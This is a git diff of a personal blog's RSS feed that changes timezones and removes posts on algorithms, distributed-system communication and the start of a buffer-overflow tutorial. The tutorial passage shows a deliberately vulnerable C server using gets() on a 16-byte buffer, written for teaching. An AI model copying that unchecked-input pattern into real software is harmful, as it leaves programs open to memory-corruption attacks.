+        <guid isPermaLink="true">http://huangxuan.me/2016/03/14/Cracking-Code-Challenge-The-Hard-Way-Stack-Queue-Priority-Queue-and-advanced-applications-1-Stack-and-Monotone-Priority-Queue/</guid>
+        
+        <category>code challenge</category>
+        
+        <category>stack</category>
+        
+        <category>monotone priority queue</category>
+        
+        
+      </item>
     
       <item>
         <title>Cracking Code Challenge The Hard Way - Iterator Design Pattern</title>
@@ -130,7 +1256,7 @@ public T getCurrent() throws NoSuchElementException {
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sat, 05 Mar 2016 01:01:00 -0800</pubDate>
+        <pubDate>Sat, 05 Mar 2016 01:01:00 +0800</pubDate>
         <link>http://huangxuan.me/2016/03/05/Cracking-Code-Challenge-The-Hard-Way-Iterator-Design-Pattern/</link>
         <guid isPermaLink="true">http://huangxuan.me/2016/03/05/Cracking-Code-Challenge-The-Hard-Way-Iterator-Design-Pattern/</guid>
         
@@ -182,7 +1308,7 @@ public T getCurrent() throws NoSuchElementException {
 
 &lt;p&gt;从男人角度思考，我觉得事业上一定要有dream，才不会鼠目寸光，不会束手束脚；而家庭上要尽早落地，才能避免盲目的拼搏挣断了现实的风筝线。&lt;/p&gt;
 </description>
-        <pubDate>Fri, 26 Feb 2016 02:17:00 -0800</pubDate>
+        <pubDate>Fri, 26 Feb 2016 02:17:00 +0800</pubDate>
         <link>http://huangxuan.me/2016/02/26/why-go-abroad/</link>
         <guid isPermaLink="true">http://huangxuan.me/2016/02/26/why-go-abroad/</guid>
         
@@ -191,613 +1317,6 @@ public T getCurrent() throws NoSuchElementException {
         <category>thought</category>
         
         <category>life</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Cracking Code Challenge The Hard Way - Two pointerswo pointers</title>
-        <description>&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;
-
-&lt;p&gt;Two pointers is an idea applicable to many algorithm challenge. The key idea is to think in a parallel way, rather than sequential way which is more natural to humans.&lt;/p&gt;
-
-&lt;p&gt;In this post, I will show how to apply the idea of two pointers to these example problems:&lt;br /&gt;
-1.&lt;a href=&quot;https://leetcode.com/problems/intersection-of-two-linked-lists/&quot;&gt;Intersection of Two Linked Lists&lt;/a&gt;&lt;br /&gt;
-2.&lt;a href=&quot;https://leetcode.com/problems/merge-sorted-array/&quot;&gt;Merge Sorted Array&lt;/a&gt;&lt;br /&gt;
-3.&lt;a href=&quot;https://leetcode.com/problems/container-with-most-water/&quot;&gt;Container With Most Water&lt;/a&gt;&lt;br /&gt;
-4.&lt;a href=&quot;https://leetcode.com/problems/trapping-rain-water/&quot;&gt;Trapping Rain Water&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;how-to-use-two-pointers-idea&quot;&gt;How to use two pointers idea&lt;/h2&gt;
-
-&lt;p&gt;Whenever you find the problem has two boundaries, or two chains (a human-readable word for LinkedList XD) etc. you could try with two pointers idea.&lt;/p&gt;
-
-&lt;p&gt;The trick for using two pointers is three step:&lt;br /&gt;
-1.Identify where to begin, i.e. where are the start points of the two pointers.&lt;br /&gt;
-2.Identify how to move on, i.e. each step how should the two pointers ‘walk’, which of them should ‘walk’.&lt;br /&gt;
-3.Identify when to stop, i.e. the condition to stop or swap turn in ‘walk’.&lt;/p&gt;
-
-&lt;h2 id=&quot;example-1---intersection-of-two-linked-lists&quot;&gt;Example 1 - Intersection of Two Linked Lists&lt;/h2&gt;
-
-&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/intersection-of-two-linked-lists/&quot;&gt;Intersection of Two Linked Lists&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;There are lots of ways to solve this problem, with tradeoff among time, space and development complexity.&lt;/p&gt;
-
-&lt;p&gt;When analyzing complexity of algorithm, we suppose both linked list has length N, and number of nodes before intersection is L.&lt;/p&gt;
-
-&lt;h3 id=&quot;most-straightforward-way&quot;&gt;Most straightforward way&lt;/h3&gt;
-
-&lt;p&gt;The most straightforward way is first iterate one linked list, store every node in a hash table. Then iterate the second linked list, check whether the node is already in hash table for each iteration and stop when find the first one.&lt;/p&gt;
-
-&lt;p&gt;The time complexity is O(N + L). And space complexity is O(N).&lt;/p&gt;
-
-&lt;h3 id=&quot;improve-space-complexity-to-o1&quot;&gt;Improve space complexity to O(1)&lt;/h3&gt;
-
-&lt;p&gt;Suppose the lengths of two linked lists are the same, i.e. before intersection the two linked lists have same number of nodes, then if there are two pointers walking through two linked list at same time and speed, then the first time they meet it the intersection.&lt;/p&gt;
-
-&lt;p&gt;Now the problem is we are not guaranteed that these two linked list are of same length. Could we possibly make them the same? &lt;strong&gt;stop here, and think&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Of course! If we could calculate the difference of lengths of two linked list, then just pass several nodes of the longer linked list, then the lengths are the same!&lt;/p&gt;
-
-&lt;p&gt;This algorithm has O(2N + 2L) time complexity but only O(1) space complexity.&lt;/p&gt;
-
-&lt;p&gt;The solution of this method is actually given &lt;a href=&quot;http://www.geeksforgeeks.org/write-a-function-to-get-the-intersection-point-of-two-linked-lists/&quot;&gt;here at method 3&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;improve-time-complexity-to-o2l&quot;&gt;Improve time complexity to O(2L)&lt;/h3&gt;
-
-&lt;p&gt;This is my original solution that I never find online. This solution actually use more space but is faster averagely.&lt;/p&gt;
-
-&lt;p&gt;So the problem of our naive solution is that we traverse the two linked lists one by one. Notice these two linked lists are actually symmetric, so that we could check if node in list A has been met in list B ……. and also if node in list B has been met in list A &lt;strong&gt;at same time&lt;/strong&gt;!&lt;/p&gt;
-
-&lt;p&gt;Given this idea, we could have two pointers starting together, each has a hash table saving iterated nodes. Each iteration, both pointers check if the new node is in hash table of the other pointer. And it could stop as soon as one of pointer find such a node, which is the intersection.&lt;/p&gt;
-
-&lt;p&gt;This algorithm gives O(2L) time complexity and O(2L) space complexity. So in worst case, this is O(2N) time complexity and O(2N) space complexity. But averagely it has O(N) time complexity and O(N) space complexity.&lt;/p&gt;
-
-&lt;h2 id=&quot;example-2---merge-sorted-array&quot;&gt;Example 2 - Merge Sorted Array&lt;/h2&gt;
-
-&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/merge-sorted-array/&quot;&gt;Merge Sorted Array&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;This is a great example to use two pointer idea. If you go through two arrays one by one, then either you could first save one array in a hash table, and check existence when traversing the second array, or you could use binary search when traversing both arrays. Both methods sacrifice time or space to some extend.&lt;/p&gt;
-
-&lt;p&gt;The actual trick in this problem is the second step of two pointers solution, i.e. how to move on. Notice the arrays are sorted, so that we are guaranteed the pointed value is increasing. This indicates, if pointer A is pointing to larger number than pointer B, then any number after pointer A could not be the same as the number at pointer B.&lt;/p&gt;
-
-&lt;p&gt;This key idea results in this algorithm.&lt;/p&gt;
-
-&lt;h2 id=&quot;example-3----container-with-most-water&quot;&gt;Example 3 – Container With Most Water&lt;/h2&gt;
-
-&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/container-with-most-water/&quot;&gt;Container With Most Water&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;As you may noticed, the constraint of this problem that requires two boundaries falls in pattern of two pointers. So a quick idea is using two pointers as two boundaries, and to find two position than could hold most water.&lt;/p&gt;
-
-&lt;p&gt;Now let’s go through three steps in two pointers problem.&lt;/p&gt;
-
-&lt;p&gt;First, where to begin? The naive way is go from one side to another side and search all possible combinations. This will result in O(N^2) time complexity. It sucks. A commonly used trick is we one pointer go from begin and another from end, then two pointers go face to face towards middle. The key idea is a little bit similar to dynamic programming, i.e. if I could know what happen given boundary [i, j], then I could calculate the condition given boundary [i + 1, j - 1] really fast.&lt;/p&gt;
-
-&lt;p&gt;Second, how to move on? To solve the problem with O(N) algorithm, each iteration must give one choice. What I mean is, given condition of [i, j], we could then check [i + 1, j] and [i, j - 1] and to iteratively find the result, but in this way it still is a O(N^2) algorithm. If we could eliminate one of the possibility, then the algorithm would be O(N)! Actually we could do that. If height at i is smaller than height at j, then there’s no reason for us to check [i, j - 1]! So we move the one with smaller height toward the larger one.&lt;/p&gt;
-
-&lt;p&gt;Third, when to stop? Obviously, when two pointers meet, we stop.&lt;/p&gt;
-
-&lt;p&gt;The time complexity of this algorithm is O(N) and space complexity is O(1).&lt;/p&gt;
-
-&lt;h2 id=&quot;example-4----trapping-rain-water&quot;&gt;Example 4 – Trapping Rain Water&lt;/h2&gt;
-
-&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/trapping-rain-water/&quot;&gt;Trapping Rain Water&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Although this is a hard level problem in leetcode, given the solution to above problem, it should be easy to think of the solution to this one.&lt;/p&gt;
-
-&lt;p&gt;To briefly explain the solution to this problem, we use two pointer start from begin and end, and go toward each other. Each time we move the pointer with shorter block to the one with bigger, and calculate the water trapping within the range. We stop when two pointers meet.&lt;/p&gt;
-</description>
-        <pubDate>Fri, 19 Feb 2016 20:53:00 -0800</pubDate>
-        <link>http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Two-pointers/</link>
-        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Two-pointers/</guid>
-        
-        <category>Two Pointers</category>
-        
-        <category>Code Challenge</category>
-        
-        <category>leetcode</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Cracking Code Challenge The Hard Way - Introduction</title>
-        <description>&lt;blockquote&gt;
-  &lt;p&gt;This blog series are to help new grads like me to prepare algorithm interview/tech interview. These posts focus on common useful data structures, algorithms, test strategies and some tricks to help you to crack code challenge!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;situation-at-tech-industry-is-not-that-bad&quot;&gt;Situation at tech industry is not that bad&lt;/h2&gt;
-
-&lt;p&gt;Yes, many said another tech bubble is bursting. Twitter fired around 8 percent of their employees, much are from engineer and product teams[1]. LinkedIn’s value drop by almost half (nearly 11 billions) in one single night[2]. STEM Opt extension is under possibility to be cut[3].&lt;/p&gt;
-
-&lt;p&gt;But, as far as I have observed, the situation is not that bad. Tech companies still pay large amount of dollars to provide flights and hotels for interviewees. The head counts of large tech companies(e.g. FLAG) may be reduced but overall head counts, including great number of emerging small companies, is still amazingly high. New Grads are still getting decent salaries and bonus.&lt;/p&gt;
-
-&lt;h2 id=&quot;yet-you-need-to-be-well-prepared&quot;&gt;Yet you need to be well-prepared&lt;/h2&gt;
-
-&lt;p&gt;I have no dare neither experience to foretell the future of computer science industry. But the truth is competition has significantly raised during these years. Even five years ago, the famous &lt;a href=&quot;leetcode.com&quot;&gt;Leetcode.com&lt;/a&gt; (a coding practice platform) has no more than one hundred problems and a student mastering all these solutions would be very likely to be hired by good tech companies. But the website has more than three hundred problems now (334 on Feb 19th 2016) and one not only need to solve these problems but is also required to solve them bug-freely.&lt;/p&gt;
-
-&lt;p&gt;It is hard. It is the reality.&lt;/p&gt;
-
-&lt;h2 id=&quot;whats-this-blog-series-is&quot;&gt;What’s this blog series is?&lt;/h2&gt;
-
-&lt;p&gt;The motivation for this series is to help young CS students, especially newbies, to better prepare frequent technical questions.&lt;/p&gt;
-
-&lt;p&gt;There are several common solution to all these questions, and each solution shows, given constraints or simplification of real-world scenario, how a software engineer thinks from a programmer’s perspective, i.e. tradeoff among space and time complexity or tradeoff among development complexity and algorithm efficiency etc.&lt;/p&gt;
-
-&lt;p&gt;In this series, you would hopefully learn when and how to use some most useful data structures and algorithms, the difference and tradeoff among these data structures and algorithms, how to implement some of these data structures, and how to analyze time and space tradeoff among these data structures and algorithms.&lt;/p&gt;
-
-&lt;h2 id=&quot;what-this-blog-series-is-not&quot;&gt;What this blog series is NOT?&lt;/h2&gt;
-
-&lt;p&gt;I definitely absolutely totally do not want you to memorize the solutions here. Surely there are some patterns/templates that maybe helpful if you remember them. But the solution is based on an deep understanding of all those data structures and algorithms and a little bit of tricks.&lt;/p&gt;
-
-&lt;p&gt;Remember that memorizing a solution always do no good to your interview.&lt;/p&gt;
-
-&lt;h2 id=&quot;entries-to-cracking-code-challenge&quot;&gt;Entries to Cracking Code Challenge&lt;/h2&gt;
-
-&lt;p&gt;Here is links for all articles in the series (continuously adding more).&lt;br /&gt;
-1. Two pointers&lt;br /&gt;
-2. Binary Tree (Binary tree, Thread Tree)&lt;br /&gt;
-3. Dictionary Problem (Hashmap, Perfect hashing, Trie Tree)&lt;br /&gt;
-3. Scanning Line Problem (Priority queue)&lt;br /&gt;
-4. Sliding Stream and Sliding Window Problem (Priority queue and Monotone priority queue)&lt;br /&gt;
-5. Dynamic Programming (Hashmap)&lt;br /&gt;
-6. LinkedList&lt;br /&gt;
-7. Search (Binary search, Hashmap)&lt;/p&gt;
-
-&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
-
-&lt;p&gt;[1]&lt;a href=&quot;http://www.sfgate.com/business/article/Twitter-to-lay-off-336-employees-6568501.php&quot;&gt;Twitter lays off 336 employees upon Dorsey’s return as CEO&lt;/a&gt;&lt;br /&gt;
-[2]&lt;a href=&quot;http://www.reuters.com/article/linkedin-results-research-idUSKCN0VE1N0&quot;&gt;LinkedIn sheds $11 billion in value on stock’s worst day since debut&lt;/a&gt;&lt;br /&gt;
-[3]&lt;a href=&quot;http://www.nafsa.org/Find_Resources/Supporting_International_Students_And_Scholars/ISS_Issues/Issues/Focus_On_STEM_OPT/&quot;&gt;Focus On STEM OPT&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 19 Feb 2016 16:12:00 -0800</pubDate>
-        <link>http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Introduction/</link>
-        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Introduction/</guid>
-        
-        <category>Code Challenge</category>
-        
-        <category>Algorithm</category>
-        
-        <category>Data Structure</category>
-        
-        <category>Interview</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Talking within Distributed System</title>
-        <description>&lt;blockquote&gt;
-  &lt;p&gt;This is a short series about some important concepts in distributed system.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;
-
-&lt;p&gt;In this article, I first tried to explain what’s difference between communication in distributed system and local machine.&lt;/p&gt;
-
-&lt;p&gt;Then I talked about two most popular way to communicate within a distributed system, i.e. message passing and RPC, and analyzed the advantages and disadvantages of them.&lt;/p&gt;
-
-&lt;p&gt;Finally, I introduced two most successful protocol using these two communication idea, i.e. RESTful and Thrift.&lt;/p&gt;
-
-&lt;h2 id=&quot;why-talking-within-distributed-system-is-different-from-local-machine&quot;&gt;Why talking within distributed system is different from local machine?&lt;/h2&gt;
-
-&lt;p&gt;In a local machine, when process A is communicating with process B, it could be done in a synchronized fashion guaranteed by electrical circuit or the so-called bus built in your laptop or server. So the delivery time is always constant, corresponding to several clock cycles.&lt;/p&gt;
-
-&lt;p&gt;The fundamental difference of distributed system and local machine is due to network unreliability. When machine A is sending message to or call function at machine B, there is not such bus connecting them so that they could only communicate through network. So either machine A get an acknowledgement message and it could be sure that machine B receive the message, or it has to wait indefinitely since it could never tell whether the message is lost or it is network congestion.&lt;/p&gt;
-
-&lt;p&gt;So it is the case that I know what I know, but I don’t know what others know, and I don’t know what others know others know…&lt;/p&gt;
-
-&lt;h2 id=&quot;an-example&quot;&gt;An example&lt;/h2&gt;
-
-&lt;p&gt;Through the next of this post, we will examine a simple common example &lt;code&gt;distcp&lt;/code&gt;. So the semantic of &lt;code&gt;distcp&lt;/code&gt; is the same as &lt;code&gt;cp&lt;/code&gt; (copy) method, it copies data from one location to another.&lt;/p&gt;
-
-&lt;p&gt;More specifically, when machine A runs &lt;code&gt;distcp path1/file path2&lt;/code&gt;, it copy &lt;code&gt;file&lt;/code&gt; from &lt;code&gt;path1&lt;/code&gt; to &lt;code&gt;path2&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;message-passing&quot;&gt;Message Passing&lt;/h2&gt;
-
-&lt;p&gt;So message passing is actually the most straightforward and also most widely used way to implement distributed system communication (think about Internet!).&lt;/p&gt;
-
-&lt;p&gt;Message Passing defines two basic method, &lt;strong&gt;send()&lt;/strong&gt; and &lt;strong&gt;receive()&lt;/strong&gt;.  It sends the whole information including operator (in our case it is &lt;code&gt;distcp&lt;/code&gt;) and operands (in our case it is &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;) through network. And when receiver receives the message, it lookups the operator and finds corresponding local method and then finishes the job.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;It is straightforward/user-friendly.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;However, despite the good point of message passing, this method leaves a lot of burden to application programmer. A common message passing is very like this:&lt;br /&gt;
-On sender’s side:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;MessageFactor.createMessage(&quot;distcp&quot;).setArgument(0, &quot;path1/file&quot;).setArgument(1, &quot;path2&quot;).send(ip of machine B)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On receiver’s side:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;operator = receive().getOperator();
-switch(operator) {
-	case &quot;distcp&quot;: copy to path; break;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;There are two obvious problem.&lt;br /&gt;
-1.Programmer needs to do lots of work to control the logic, especially on receiver’s side.&lt;br /&gt;
-2.The program could not make use of compile check to make sure the sending message is correct. This significantly increase the possibility of runtime error.&lt;/p&gt;
-
-&lt;h2 id=&quot;remote-procedure-call-rpc&quot;&gt;Remote Procedure Call (RPC)&lt;/h2&gt;
-
-&lt;p&gt;So to reduce the burden of programmers and make our program more predictable, RPC is a good idea.&lt;/p&gt;
-
-&lt;p&gt;The core idea of RPC is to provide an interface for both local and remote procedure call, so that programmer could call remote function just like call local function.&lt;/p&gt;
-
-&lt;p&gt;So the RPC way of our function is very like to be this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;register_path(&quot;path1&quot;, ip of machine A);
-register_path(&quot;path2&quot;, ip of machine B);
-dist(&quot;path1/file&quot;, &quot;path2&quot;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And it is done! How to find the file and how to bind the data is left to RPC service. After binding the path and machine, the programmer doesn’t need to worry about the whole logic. Moreover, now we could at compile time check whether the programmer provides exactly two arguments , reducing runtime error.&lt;/p&gt;
-
-&lt;p&gt;Also, it a lot of distributed system, e.g. Hadoop platform, there’s a master machine to take care of path binding, so the two &lt;code&gt;register_path&lt;/code&gt; method could be avoided as well!&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; To understand how the RPC service is implemented, I encourage you to further read some posts online or this paper &lt;a href=&quot;http://doi.acm.org/10.1145/2080.357392&quot;&gt;Implementing remote procedure calls&lt;/a&gt; by Andrew and Bruce.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;1.RPC provide the abstraction of procedure call so that programmers could use these services easily just as using local methods.&lt;br /&gt;
-2.It also helps reducing runtime errors.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
-Now RPC may seems really attracting, it has one important disadvantages compared to message passing – the service itself is much complicated.&lt;/p&gt;
-
-&lt;p&gt;Yes, the user/programmer is relieved from handling logic and data binding themselves, but the API provider/RPC service provider need to do a lot of work, including defining interface, implementing logic etc. The complication is significant when testing some new functions, since the API may change frequently during development.&lt;/p&gt;
-
-&lt;h2 id=&quot;real-world-implementation&quot;&gt;Real World Implementation&lt;/h2&gt;
-
-&lt;p&gt;Now we scratched the surface of both two common communication ways, how and when do we prefer one to the other? Let’s see two most widely used communication protocol in web service today.&lt;/p&gt;
-
-&lt;h3 id=&quot;restful&quot;&gt;RESTful&lt;/h3&gt;
-
-&lt;p&gt;I’m not going to talk about what is RESTful. I assume you have already know what it is and hopefully you have used it several times in your previous projects.&lt;/p&gt;
-
-&lt;p&gt;RESTful is a good example using the idea of message passing. For &lt;strong&gt;send()&lt;/strong&gt; method, it supports four operators, i.e. GET, PUT, POST and DELETE, and nearly unlimited number of operands (within bound of network limit of course). And &lt;strong&gt;receive()&lt;/strong&gt; method is handled by HTTP request.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
-1.Lightweight. Since RESTful API is often used for implementing CRUD operations in database, so the message is generally short.&lt;br /&gt;
-2.User-friendly. RESTful has same semantics with HTTP request, thus learning curve of RESTful is almost zero degree!&lt;br /&gt;
-3.Language/Platform independence. Since RESTful is nothing but HTTP request, it has no constraints on language or system platform.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
-The disadvantage of RESTful stems from HTTP protocol itself.&lt;/p&gt;
-
-&lt;p&gt;One thing is RESTful does not support basic method other than HTTP’s methods. Although one could put operator inside body of HTTP request, but that would lose the lightweight property of RESTful.&lt;/p&gt;
-
-&lt;p&gt;Another disadvantage is HTTP request is expensive. Each HTTP request is generally a blocking process, harming the scalability of system. (This is said be overcome in HTTP 2.0, I’m not quite familiar with HTTP 2.0, but this disadvantage holds for HTTP 1.1).&lt;/p&gt;
-
-&lt;h3 id=&quot;thrift&quot;&gt;Thrift&lt;/h3&gt;
-
-&lt;p&gt;My understanding of Thrift may not be correct and well-rounded, since I haven’t use Thrift a lot. But generally, Thrift is a protocol based on RPC so that to simplify remote call process and with goal of a fast, reliable and safe communication.&lt;/p&gt;
-
-&lt;p&gt;To use Thrift, you need first define the RPC interface using Interface Definition Language (IDL). This interface is a constraint that both server and clients using the method should follow. After you defined the interface, it is Thrift that will take care of the underlying communication and compile time checking.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
-1.Provide compile time checking. Thrift is much stricter than RESTful, but the goodness is it could help avoid lots of small errors.&lt;br /&gt;
-2.It is faaaaast. RPC generally take advantages of UDP protocol and binding acknowledgement message with next request to avoid overhead and amount of exchanging data.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
-It is obvious that Thrift is way complicated than RESTful API. It also doesn’t have a universal method name (e.g. GET in RESTful). Therefore developers need to first learn the interface of different Thrift library then could they move on.&lt;/p&gt;
-
-&lt;h2 id=&quot;discussion&quot;&gt;Discussion&lt;/h2&gt;
-
-&lt;p&gt;So how to choose among them? Like most design in computer science, there is no absolute yes or no to choose one protocol rather than the other.&lt;/p&gt;
-
-&lt;p&gt;It has been a consensus that, generally, when developing light-weight api, especially those similar with CRUD operations, and when your api is used by lots of users, then RESTful may be better choice. While developing api that is internally used, or logically complicated, or fast is your first priority, then Thrift may be better.&lt;/p&gt;
-
-&lt;p&gt;In comparison these protocol, here is a great &lt;a href=&quot;http://nordicapis.com/microservice-showdown-rest-vs-soap-vs-apache-thrift-and-why-it-matters/&quot;&gt;article&lt;/a&gt; by Kristopher  Sandoval. I quote part of the article here, but you should definitely read through that great post.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;REST, on the other hand, is like a pre-paid postcard. You’ve forgone the envelope in favor of a lightweight, succinct delivery device that is easy to interpret and handle, with your message quickly scribbled on the back. The postcard uses less material (bandwidth), is typically shorter in content, and might actually get to your neighbor faster because there’s less bulk to move around.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Thrift is like a megaphone. When you point the megaphone at your neighbor, he implicitly knows you’re upset about something — and that you’re going to say it specifically to him. He knows what to do with the information, because the reaction a human has to a megaphone is pretty universal (assuming, of course, that your megaphone is louder than his drums). The message is sent in a lightweight but forceful manner that depends entirely on the receiver to properly process it, in this case your neighbor.&lt;/p&gt;
-&lt;/blockquote&gt;
-</description>
-        <pubDate>Fri, 19 Feb 2016 14:41:00 -0800</pubDate>
-        <link>http://huangxuan.me/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</link>
-        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</guid>
-        
-        <category>Distributed System</category>
-        
-        <category>Network</category>
-        
-        <category>Communication</category>
-        
-        <category>Message Passing</category>
-        
-        <category>RPC</category>
-        
-        <category>Remote Procedure Call</category>
-        
-        <category>RESTful</category>
-        
-        <category>Thrift</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Secure Threats -- Buffer Overflow Attack -- Level 0</title>
-        <description>&lt;p&gt;This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)&lt;/p&gt;
-
-&lt;p&gt;This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Pre-requisite&lt;/strong&gt; &lt;br /&gt;
-The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Familiar with C language. (This series would use C program as example.) And know how to use a &lt;code&gt;gdb&lt;/code&gt; to debug C program.&lt;/li&gt;
-  &lt;li&gt;Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)&lt;/li&gt;
-  &lt;li&gt;Know what’s a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png&quot; alt=&quot;Program Memory Organization&quot; /&gt; &lt;br /&gt;
-&lt;em&gt;(&lt;a href=&quot;http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&amp;amp;qid=1454639716&amp;amp;sr=8-3&amp;amp;keywords=csapp&quot;&gt;Computer System : A Programmer’s Perspective 2nd&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;buffer-overflow-attack&quot;&gt;Buffer Overflow Attack&lt;/h2&gt;
-
-&lt;p&gt;Great, now you are ready to hack a system, and I’m showing you a way.&lt;/p&gt;
-
-&lt;h3 id=&quot;what-is-buffer-overflow&quot;&gt;What is Buffer Overflow&lt;/h3&gt;
-&lt;p&gt;Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn’t check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host’s  stack memory and make the hack.&lt;/p&gt;
-
-&lt;h3 id=&quot;an-example-your-first-hacking-attack&quot;&gt;An Example (Your first hacking attack!)&lt;/h3&gt;
-
-&lt;p&gt;To make this clearer, let’s see a typical example.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic.c */
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-
-/* server code, I&#39;m victim */
-int main(int argc, char** argv)
-{
-    char buf[16] ;
-
-    printf(&quot;Hi, I&#39;m server.\n&quot;);
-    gets(buf);
-    printf(&quot;you entered: %s\n&quot;, buf);
-
-    return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this &lt;code&gt;gets&lt;/code&gt; function. Basically &lt;code&gt;gets&lt;/code&gt; copy string from standard input to &lt;code&gt;buf&lt;/code&gt;. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.&lt;/p&gt;
-
-&lt;p&gt;By running following script,&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -o basic basic.c -m32
-objdump -d basic
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;we could get assembly code of &lt;code&gt;basic&lt;/code&gt;. &lt;br /&gt;
-(&lt;strong&gt;Note we add a &lt;code&gt;-m32&lt;/code&gt; here to compile it to a 32-bit version&lt;/strong&gt;)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;08048480 &amp;lt;main&amp;gt;:
- ......
- 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
- 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
- 804849c:  e8 9f fe ff ff     call   8048340 &amp;lt;gets@plt&amp;gt;
- ......
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;I’m not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.&lt;/p&gt;
-
-&lt;h4 id=&quot;now-is-key-point&quot;&gt;&lt;strong&gt;Now is key point.&lt;/strong&gt;&lt;/h4&gt;
-&lt;p&gt;Then what &lt;code&gt;gets&lt;/code&gt; function does is it go through standard input and copy byte by byte to &lt;code&gt;buf&lt;/code&gt; until it met a &lt;code&gt;null&lt;/code&gt; terminator. However, the &lt;code&gt;gets&lt;/code&gt; function doesn’t check input length! So what if we input a very long sentence?&lt;/p&gt;
-
